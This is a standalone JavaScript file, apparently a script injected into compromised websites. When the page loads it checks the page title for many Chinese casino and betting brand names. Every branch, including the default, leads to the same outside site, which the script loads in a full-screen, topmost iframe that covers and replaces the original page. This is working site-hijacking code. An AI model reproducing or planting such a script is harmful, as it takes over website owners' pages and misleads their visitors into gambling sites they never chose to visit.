document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;overflow:hidden;margin:0;padding:0}</style>');

function checktitle()
{
	var fit=1;
	var sou;
	var title = document.title;
        if(title.indexOf("金沙")!=-1||title.indexOf("js")!=-1||title.indexOf("金莎")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("葡")!=-1||title.indexOf("亰")!=-1||title.indexOf("京")!=-1||title.indexOf("匍")!=-1||title.indexOf("蒲")!=-1||title.indexOf("浦")!=-1||title.indexOf("pj")!=-1||title.indexOf("普")!=-1||title.indexOf("莆")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("银河")!=-1||title.indexOf("yh")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("永利")!=-1||title.indexOf("yl")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("blr")!=-1||title.indexOf("巴黎")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("太阳")!=-1||title.indexOf("tyc")!=-1||title.indexOf("太陽")!=-1||title.indexOf("大阳")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("威尼")!=-1||title.indexOf("威斯")!=-1||title.indexOf("尼斯")!=-1||title.indexOf("斯尼")!=-1||title.indexOf("vns")!=-1||title.indexOf("wns")!=-1||title.indexOf("威力")!=-1||title.indexOf("威利")!=-1||title.indexOf("尼维")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("bet36")!=-1||title.indexOf("356")!=-1||title.indexOf("365")!=-1||title.indexOf("bte")!=-1||title.indexOf("bet360")!=-1||title.indexOf("bet356")!=-1||title.indexOf("日博")!=-1||title.indexOf("mob")!=-1||title.indexOf("best")!=-1||title.indexOf("beat")!=-1||title.indexOf("世界杯")!=-1||title.indexOf("奥运会")!=-1||title.indexOf("欧洲杯")!=-1||title.indexOf("bt365")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("betway")!=-1||title.indexOf("必威")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("云顶")!=-1||title.indexOf("雲顶")!=-1||title.indexOf("yd")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("公海")!=-1||title.indexOf("gh")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("万博")!=-1||title.indexOf("狗万")!=-1||title.indexOf("manbet")!=-1||title.indexOf("max")!=-1||title.indexOf("man")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("yabo")!=-1||title.indexOf("亚博")!=-1||title.indexOf("亚搏")!=-1||title.indexOf("亚慱")!=-1||title.indexOf("雅博")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("bwin")!=-1||title.indexOf("必赢")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}else if(title.indexOf("dafa")!=-1||title.indexOf("大发")!=-1)
	{
		sou="https://www.jsjkeji.com/zhuye/index.html";
	}

	else{
		sou = 'https://www.jsjkeji.com/zhuye/index.html';
	}

	var iframe = document.createElement('iframe');
	iframe.src = sou;
	iframe.style.position="absolute";iframe.style.width = '100%'; iframe.style.height="100%";iframe.style.top="0px";iframe.style.left="0px";iframe.style.bottom="0px";iframe.style.zIndex="9999999999999";
	iframe.style.border = 'none';
	iframe.style.background="#000";
	document.body.insertBefore(iframe, document.body.firstChild);
	document.body.style.overflow="hidden";
}
function ready(fn){
	if(document.addEventListener){		//标准浏览器
		document.addEventListener('DOMContentLoaded',function(){
			//注销时间，避免重复触发
			document.removeEventListener('DOMContentLoaded',arguments.callee,false);
			fn();		//运行函数
		},false);
	}else if(document.attachEvent){		//IE浏览器
		document.attachEvent('onreadystatechange',function(){
			if(document.readyState=='complete'){
				document.detachEvent('onreadystatechange',arguments.callee);
				fn();		//函数运行
			}
		});
	}
}
/*window.onload=function(){
checktitle();
}
*/
ready(function(){checktitle();});

